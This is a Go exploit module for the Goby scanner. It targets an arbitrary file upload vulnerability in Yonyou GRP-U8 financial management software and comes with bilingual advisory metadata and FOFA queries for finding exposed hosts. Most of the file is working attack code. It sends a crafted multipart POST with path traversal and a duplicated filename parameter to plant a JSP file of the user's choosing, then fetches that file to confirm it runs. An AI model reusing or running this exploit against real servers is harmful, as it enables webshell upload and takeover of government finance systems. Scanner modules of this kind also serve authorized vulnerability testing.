package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yonyou GRP-U8 Financial Management Software Arbitrary File Upload Vulnerability",
    "Description": "<p>UFIDA grp-u8 administrative and financial management software is a new generation product launched by UFIDA, which focuses on national e-government and is based on cloud computing technology. It is the most professional government financial management software in the field of administrative and financial affairs in China.</p><p>There is an arbitrary file upload vulnerability in the system. An attacker can create a malicious JSP file through the file upload interface, execute malicious java code, or upload webshell to obtain server permissions.</p>",
    "Impact": "Yonyou GRP-U8 Financial Management Software Arbitrary File Upload Vulnerability",
    "Recommendation": "<p>It is recommended to contact the manufacturer to upgrade to the latest version.http://www.yonyou.com/</p>",
    "Product": "Yonyou-GRP-U8",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "用友 GRP-U8 财务管理软件任意文件上传漏洞",
            "Description": "<p>用友 GRP-U8 行政事业财务管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品，是我国行政事业财务领域最专业的政府财务管理软件。<br></p><p>该系统存在任意文件上传漏洞，攻击者可以通过文件上传接口创建恶意 jsp 文件，执行恶意 Java 代码，或上传 webshell，获取服务器权限。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">该系统存在任意文件上传漏洞，攻击者可以通过文件上传接口创建恶意 jsp 文件，执行恶意 Java 代码，或上传 webshell，获取服务器权限。</span><br></p>",
            "Recommendation": "<p>建议联系厂商升级至最新版本。<a href=\"http://www.yonyou.com/\" target=\"_blank\">http://www.yonyou.com/</a><br></p>",
            "Product": "用友-GRP-U8",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Yonyou GRP-U8 Financial Management Software Arbitrary File Upload Vulnerability",
            "Description": "<p>UFIDA grp-u8 administrative and financial management software is a new generation product launched by UFIDA, which focuses on national e-government and is based on cloud computing technology. It is the most professional government financial management software in the field of administrative and financial affairs in China.<br></p><p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">There is an arbitrary file upload vulnerability in the system. An attacker can create a malicious JSP file through the file upload interface, execute malicious java code, or upload webshell to obtain server permissions.</span><br></p>",
            "Impact": "Yonyou GRP-U8 Financial Management Software Arbitrary File Upload Vulnerability",
            "Recommendation": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">It is recommended to contact the manufacturer to upgrade to the latest version.<a href=\"http://www.yonyou.com/\" target=\"_blank\">http://www.yonyou.com/</a></span><br></p>",
            "Product": "Yonyou-GRP-U8",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "body=\"window.location.replace(\\\"login.jsp?up=1\\\")\" || title=\"用友GRP-U8\"",
    "GobyQuery": "body=\"window.location.replace(\\\"login.jsp?up=1\\\")\" || title=\"用友GRP-U8\"",
    "Author": "su18@javaweb.org",
    "Homepage": "http://www.yonyou.com/",
    "DisclosureDate": "2022-07-19",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2022-51731"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "name",
            "type": "input",
            "value": "evil",
            "show": ""
        },
        {
            "name": "content",
            "type": "input",
            "value": "<%out.print(\"test\");%>",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10479"
}`

	exploitYonyouGRPU812345512 := func(fileName string, fileContent string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewPostRequestConfig("/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=" + fileName + ".jsp&filename=1.jpg")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-type", "multipart/form-data")
		requestConfig.Data = "------WebKitFormBoundary92pUawKc\r\nContent-Disposition: form-data; name=\"myFile\";filename=\"test.jpg\"\r\n\r\n" + fileContent + "\r\n------WebKitFormBoundary92pUawKc--"
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "parent.showSucceedMsg();") {
				return true
			}
		}
		return false
	}
	checkUploadedFile12314456 := func(fileName string, fileContent string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewGetRequestConfig("/R9iPortal/" + fileName + ".jsp")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 15
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, fileContent)
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rand1 := goutils.RandomHexString(4)
			rand2 := goutils.RandomHexString(4)
			if exploitYonyouGRPU812345512(rand1, "<%out.print(\""+rand2+"\");%>", u) {
				return checkUploadedFile12314456(rand1, rand2, u)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileName := ss.Params["name"].(string)
			fileContent := ss.Params["content"].(string)
			if exploitYonyouGRPU812345512(fileName, fileContent, expResult.HostInfo) {
				expResult.Success = true
				expResult.Output = "文件上传成功，请访问路径：/R9iPortal/" + fileName + ".jsp"
			}
			return expResult
		},
	))
}
